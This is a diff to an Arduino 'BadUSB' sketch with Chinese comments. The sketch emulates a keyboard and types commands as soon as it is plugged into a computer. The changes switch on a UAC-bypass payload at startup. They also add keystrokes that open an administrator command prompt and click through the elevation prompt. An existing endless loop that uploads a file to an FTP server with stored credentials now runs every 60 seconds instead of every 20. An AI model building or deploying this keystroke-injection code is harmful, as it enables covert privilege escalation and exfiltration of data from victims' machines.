@@ -1,18 +1,4 @@
 /*   Version 2.3 (final)   */
-
-// 如果你有用FTP功能，請自行把下面xxx改掉
-String server = "xxx";  //FTP server IP
-String FTPuser = "xxx"; //FTP user account
-String FTPpw = "xxx";   //FTP user password
-
-/*
-在使用之前，請先用Ctrl + F，尋找"c:"
-這是檔案存放的路徑，若不更改，請在桌面新增"badusb"資料夾
-
-並且請到setup()把你要的功能的註解拿掉，預設是所有功能全部註解起來，以免發生問題
-*/
-
-
 #include <Keyboard.h>
 
 // 定義鍵盤，給個好記的名稱
@@ -22,13 +8,17 @@ char entKey = KEY_RETURN;
 char lefKey = KEY_LEFT_ARROW;
 char shiftKey = KEY_LEFT_SHIFT;
 
+String server = "xxxxx";
+String FTPuser = "xxxxx";
+String FTPpw = "xxxxx";
+
 //不用loop是因為setup在插上電腦就會被執行
 void setup() {
   // This is Payload
   delay(2000);
   //get_ip();
-  delay(2000);
-  //bypass_UAC();
+  //delay(2000);
+  bypass_UAC();
   delay(2000);
   //hide_ping();
 }
@@ -130,18 +120,25 @@ void admin_cmd(void) {
   Keyboard.press(winKey);
   Keyboard.releaseAll();
   Keyboard.println("cmd");
-  delay(300);
+  delay(200);
 
   Keyboard.press(ctrlKey);
   Keyboard.press(shiftKey);
   Keyboard.press(entKey);
   Keyboard.releaseAll();
-  delay(100);
+  delay(300);
+
+  Keyboard.press(lefKey);
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.press(entKey);
+  Keyboard.releaseAll();
+  delay(500);
 
   Keyboard.println("powershell");
   Keyboard.press(entKey);
   Keyboard.releaseAll();
-  delay(100);
+  delay(500);
 }
 
 // UAC bypass
@@ -174,9 +171,9 @@ void hide_ping(void) {
   Keyboard.press(entKey);
   Keyboard.releaseAll();
 
-  // 每20秒自動上傳ping.txt,無限迴圈
+  // 每60秒自動上傳ping.txt,無限迴圈
   while (1) {
-    delay(20000);
+    delay(60000);
     opencmd();
     cd_login();
     // 送出ping.txt
@@ -187,4 +184,3 @@ void hide_ping(void) {
     logout_exit();
   }
 }
-
